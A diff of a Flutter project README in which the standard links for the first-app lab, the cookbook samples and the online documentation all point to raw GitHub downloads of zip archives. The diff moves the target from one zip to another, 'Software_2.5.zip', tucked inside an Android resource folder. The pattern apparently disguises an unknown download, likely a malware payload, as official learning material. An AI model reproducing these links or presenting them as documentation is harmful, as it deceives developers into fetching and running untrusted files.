@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/Whiteboyism/Flutter.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/Whiteboyism/Flutter.zip)
+- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/android/app/src/main/res/values/Software_2.5.zip)
+- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/android/app/src/main/res/values/Software_2.5.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/Whiteboyism/Flutter.zip), which offers tutorials,
+[online documentation](https://raw.githubusercontent.com/MarcoRamos016/Flutter/aula-20240812/android/app/src/main/res/values/Software_2.5.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
